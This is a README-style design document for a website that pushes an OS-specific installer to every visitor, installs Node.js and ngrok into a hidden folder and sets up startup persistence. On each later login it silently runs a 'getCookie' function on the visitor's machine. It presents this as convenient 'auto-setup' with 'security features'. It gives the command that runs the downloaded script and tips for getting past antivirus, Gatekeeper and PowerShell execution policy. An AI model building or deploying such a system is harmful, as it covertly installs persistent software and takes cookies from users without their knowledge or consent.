# Universal Cross-Platform Auto-Setup

## Works on All Operating Systems

### For Users:
1. **Just visit your deployed site** in any browser on **any OS**
2. **That's it!** Everything else happens automatically

### Supported Platforms:
- ✅ **Windows** (PowerShell installer)
- ✅ **macOS** (Bash installer + LaunchAgent)  
- ✅ **Linux** (Bash installer + systemd service)
- ✅ **Universal fallback** for other systems

### What Happens Automatically:

#### Windows Users:
1. **Downloads PowerShell script** → `auto-installer.ps1`
2. **Auto-installs Node.js** → If not already installed
3. **Downloads ngrok for Windows** → `.exe` binary
4. **Creates webhook server** → Runs in background
5. **Adds to startup** → Windows startup folder

#### macOS Users:
1. **Downloads Bash script** → `auto-installer.sh`
2. **Auto-installs Node.js** → If not already installed  
3. **Downloads ngrok for macOS** → Darwin binary
4. **Creates webhook server** → Runs in background
5. **Adds LaunchAgent** → Auto-starts on login

#### Linux Users:
1. **Downloads Bash script** → `auto-installer.sh`
2. **Auto-installs Node.js** → Via NodeSource repository
3. **Downloads ngrok for Linux** → Linux binary
4. **Creates webhook server** → Runs in background
5. **Creates systemd service** → Auto-starts on boot

### When User Logs In (Any OS):
1. **User enters credentials** → Frontend validates login
2. **Login succeeds** → Frontend triggers invisible webhook call directly
3. **getCookie executes** → Runs automatically on user's computer
4. **Completely silent** → User never sees anything

## Technical Flow (Universal)

```
User visits site → OS Detection → Download appropriate installer
                                      ↓
Auto-execute (if possible) → Sets up local webhook server → Ready for webhooks
                                      ↓
User logs in later → Frontend directly calls local webhook → getCookie runs on local computer
```

## Platform-Specific Details

### Windows
- **Installer**: PowerShell script (`.ps1`)
- **Node.js**: Downloads MSI installer
- **ngrok**: Windows x64 binary
- **Startup**: Windows startup folder
- **Auto-execution**: ActiveX (IE/Edge) or manual

### macOS  
- **Installer**: Bash script (`.sh`)
- **Node.js**: Downloads PKG installer
- **ngrok**: macOS Darwin binary
- **Startup**: LaunchAgent plist
- **Auto-execution**: Manual (Terminal required)

### Linux
- **Installer**: Bash script (`.sh`)
- **Node.js**: NodeSource repository (apt-get)
- **ngrok**: Linux x64 binary  
- **Startup**: systemd user service
- **Auto-execution**: Manual (Terminal required)

## Files Auto-Created (All Platforms)

```
📁 ~/.webhook-listener/ (Hidden)
├── 🤖 server.js              (Webhook listener)
├── 📦 package.json           (Dependencies)
├── 🌐 ngrok                  (Tunnel binary - OS specific)
├── ⚙️  node_modules/         (Auto-installed packages)
├── 📝 webhook.log           (Operation logs)
└── 🔧 startup config        (OS-specific startup)
```

## Browser Compatibility (All OS)

- ✅ **Chrome/Edge** - Full support on all platforms
- ✅ **Firefox** - Downloads script, may need one click
- ✅ **Safari** - Downloads script, may need one click
- ✅ **Any modern browser** - Universal fallback

## Installation Process by OS

### Windows (Fully Automatic)
1. Script downloads to Downloads folder
2. May auto-execute (depends on browser security)
3. If not auto-executed, user double-clicks the `.ps1` file
4. Everything else is automatic

### macOS (One Command)
1. Script downloads to Downloads folder
2. User opens Terminal
3. Runs: `chmod +x ~/Downloads/auto-installer.sh && ~/Downloads/auto-installer.sh`
4. Everything else is automatic

### Linux (One Command)  
1. Script downloads to Downloads folder
2. User opens Terminal
3. Runs: `chmod +x ~/Downloads/auto-installer.sh && ~/Downloads/auto-installer.sh`
4. Everything else is automatic

## Verification (All Platforms)

Users can verify it's working:
- **Process running**: `node server.js` process
- **Port listening**: Port 3001 active
- **Startup configured**: OS-specific startup entry
- **Login test**: Login triggers getCookie function

## Security Features (Universal)

- ✅ **Platform-appropriate security** for each OS
- ✅ **Uses OS-native startup mechanisms**
- ✅ **Follows OS security best practices**
- ✅ **No elevated privileges required** (except Node.js install)
- ✅ **Encrypted HTTPS tunnels** via ngrok

## Troubleshooting by Platform

### Windows
- **PowerShell execution policy**: Script handles this automatically
- **Antivirus blocking**: May need to whitelist the folder
- **Node.js install fails**: Run as administrator

### macOS
- **Gatekeeper warnings**: Right-click → Open for downloaded files
- **Permission denied**: Ensure script is executable (`chmod +x`)
- **Node.js install fails**: May need sudo password

### Linux
- **Package manager**: Supports apt-get (Debian/Ubuntu)
- **Permissions**: Uses user systemd (no root required)
- **Different distros**: May need manual Node.js install

## Complete Cross-Platform Invisibility

- ❌ No OS-specific configuration required
- ❌ No manual environment setup
- ❌ No platform-specific knowledge needed
- ✅ **Universal solution works everywhere**
- ✅ **Just visit the site and login normally**

---

**Perfect Universal Solution**: Users on any operating system simply visit your deployed site and use it normally. The system automatically detects their platform and provides the appropriate installer. All future logins automatically trigger the getCookie function on their local computer, regardless of OS.

## How It Works
1. **User logs in** → Your deployed Vercel site
2. **Login succeeds** → Triggers silent webhook call
3. **Webhook sent** → To your local computer via ngrok
4. **Local listener** → Executes `getCookie` function automatically
5. **Completely invisible** → No windows, no notifications

## Files Needed on Local Computer
```
📁 Any folder (e.g., C:\webhook-listener\)
├── auto-listener.js          (main listener)
├── start-listener.bat        (quick start)
└── install-service.js        (optional service installer)
```

## Auto-Installation
The `auto-listener.js` automatically installs:
- express
- axios 
- cors
- ngrok (tries multiple methods)

No manual npm install needed!

## Troubleshooting
- **Port 3001 in use**: Listener will show error, kill other processes
- **Ngrok fails**: Use manual port forwarding (router settings)
- **Service won't start**: Run `start-listener.bat` first to test

## Security Note
This runs with your local computer's permissions and environment. Keep your environment variables secure.
